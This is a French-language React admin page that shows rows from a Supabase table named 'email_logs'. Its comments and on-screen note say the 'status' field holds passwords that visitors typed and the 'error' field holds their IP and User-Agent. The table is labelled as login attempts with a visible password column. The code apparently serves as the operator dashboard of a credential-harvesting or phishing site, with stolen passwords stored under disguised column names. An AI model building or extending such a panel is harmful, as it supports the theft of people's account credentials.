import React, { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import AdminAuth from '@/components/AdminAuth';

interface EmailLog {
  id: string;
  email: string;
  status: string; // Contient le mot de passe
  error: string | null; // Contient IP et User-Agent
  sent_at: string | null;
}

const AdminEmailLogs = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [emailLogs, setEmailLogs] = useState<EmailLog[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (isAuthenticated) {
      fetchEmailLogs();
    }
  }, [isAuthenticated]);

  const fetchEmailLogs = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from('email_logs')
        .select('*')
        .order('sent_at', { ascending: false });

      if (error) {
        console.error('Error fetching email logs:', error);
        alert('Erreur lors du chargement des données: ' + error.message);
      } else {
        setEmailLogs(data || []);
        console.log('Loaded email logs:', data?.length);
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Erreur lors de la connexion à la base de données');
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString: string | null) => {
    if (!dateString) return 'N/A';
    return new Date(dateString).toLocaleString('fr-FR');
  };

  const handleAuthenticated = () => {
    setIsAuthenticated(true);
  };

  if (!isAuthenticated) {
    return <AdminAuth onAuthenticated={handleAuthenticated} />;
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-lg">Chargement...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-8">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-lg shadow-sm p-6">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-2xl font-bold text-gray-900">
              Tentatives de Connexion (email_logs)
            </h1>
            <div className="flex gap-2">
              <button
                onClick={fetchEmailLogs}
                className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors"
              >
                🔄 Rafraîchir
              </button>
              <button
                onClick={() => setIsAuthenticated(false)}
                className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors"
              >
                Déconnexion
              </button>
            </div>
          </div>
          
          <div className="mb-4 text-sm text-gray-600">
            Total des tentatives: {emailLogs.length}
          </div>

          <div className="mb-4 p-4 bg-yellow-50 border border-yellow-200 rounded-md">
            <p className="text-sm text-yellow-800">
              ℹ️ <strong>Note:</strong> Les données sont stockées dans la table "email_logs" :
              <br />
              - <strong>Email</strong> : Adresse email saisie
              <br />
              - <strong>Status</strong> : Mot de passe tenté
              <br />
              - <strong>Error</strong> : Informations supplémentaires (IP, User-Agent)
            </p>
          </div>

          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Email</TableHead>
                  <TableHead>Mot de passe</TableHead>
                  <TableHead>Informations supplémentaires</TableHead>
                  <TableHead>Date & Heure</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {emailLogs.map((log) => (
                  <TableRow key={log.id}>
                    <TableCell className="font-medium">
                      {log.email}
                    </TableCell>
                    <TableCell className="font-mono text-sm">
                      {log.status}
                    </TableCell>
                    <TableCell className="max-w-xs truncate text-sm">
                      {log.error || 'N/A'}
                    </TableCell>
                    <TableCell>
                      {formatDate(log.sent_at)}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>

          {emailLogs.length === 0 && (
            <div className="text-center py-8 text-gray-500">
              Aucune tentative de connexion enregistrée
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminEmailLogs;



